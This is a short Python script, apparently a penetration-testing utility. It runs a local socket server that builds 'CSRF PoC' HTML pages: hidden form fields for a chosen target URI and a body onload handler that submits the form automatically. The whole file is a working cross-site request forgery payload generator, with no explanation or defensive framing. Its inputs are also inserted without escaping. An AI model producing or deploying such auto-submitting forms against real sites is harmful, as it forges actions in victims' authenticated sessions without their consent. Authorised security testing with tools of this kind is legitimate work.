import socket

def generate_csrf_form(method, encoding, data, uri, filename):
    params = ""
    if method.upper() in ["POST", "GET"]:
        params = "\n        ".join(
            [f'<input type="hidden" name="{key}" value="{value}">' for key, value in [param.split("=") for param in data.split("&")]]
        )
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body onload="document.forms[0].submit()">
    <form action="{uri}" method="{method.upper()}" enctype="{encoding}">
        {params}
        <input type="submit" value="Submit Request">
    </form>
</body>
</html>
"""

def start_server(host="127.0.0.1", port=4444):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    
    print(f"[*] Server listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection received from {addr}")

        data = client_socket.recv(1024).decode()
        if not data:
            continue

        try:
            method, encoding, params, uri, filename = data.split("|")
            csrf_form = generate_csrf_form(method, encoding, params, uri, filename)
            client_socket.send(csrf_form.encode())
        except Exception as e:
            client_socket.send(str(e).encode())

        client_socket.close()

if __name__ == "__main__":
    start_server()
